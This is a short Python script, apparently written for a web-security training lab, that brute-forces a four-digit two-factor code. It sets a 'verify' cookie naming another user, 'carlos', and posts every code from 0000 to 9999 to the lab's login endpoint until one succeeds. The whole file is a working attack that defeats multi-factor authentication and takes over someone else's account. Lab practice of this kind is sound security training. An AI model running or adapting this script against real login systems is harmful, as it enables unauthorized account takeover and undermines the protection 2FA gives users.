##!/usr/bin/env python3
import requests

# Target URL
url = 'https://0a9c00bd041367aa80d4df1d00cb00cd.web-security-academy.net/login2'

# Browser-like headers
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Referer': url,
    'Origin': url
}

# Cookies for the lab test account
cookies = {'verify': 'carlos'}

# Use a persistent session
with requests.Session() as session:
    session.headers.update(headers)
    session.cookies.update(cookies)

    for code in range(10000):
        formatted_code = f"{code:04}"  # Always 4 digits
        data = {'mfa-code': formatted_code}

        # Send the POST request
        response = session.post(url, data=data)

        # Progress output every 100 attempts
        if code % 100 == 0:
            print(f"Tried up to {formatted_code}...")

        # Check if the code was correct
        if 'Incorrect security code' not in response.text or response.status_code == 302:
            print(f"\n✅ 2FA Found: {formatted_code}")
            break
